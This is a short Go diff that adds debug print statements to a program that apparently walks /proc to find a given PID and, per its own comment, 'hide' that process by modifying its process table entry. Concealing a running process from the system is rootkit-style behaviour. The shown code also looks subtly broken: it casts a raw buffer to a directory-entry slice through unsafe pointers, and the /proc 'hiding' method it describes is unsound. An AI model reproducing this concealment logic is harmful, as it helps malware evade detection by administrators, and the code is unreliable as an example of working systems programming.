@@ -58,6 +58,9 @@ func main() {
         if n == 0 {
             break // End of directory
         }
+
+        fmt.Print(string(buf[:n]))
+
         for _, dirent := range *(*[]syscall.Dirent)(unsafe.Pointer(&buf)) {
             if dirent.Ino == 0 {
                 continue // Skip null entries
@@ -88,6 +91,7 @@ func main() {
             if err != nil {
                 continue // Failed to read status file, skip to next
             }
+            fmt.Printf("poop")
             if strings.Contains(string(statusBuf[:n]), fmt.Sprintf("Pid:\t%d\n", pid)) {
                 // Found the target process, hide it by modifying the process table entry
                 processEntry := fmt.Sprintf("/proc/%s", pidStr)
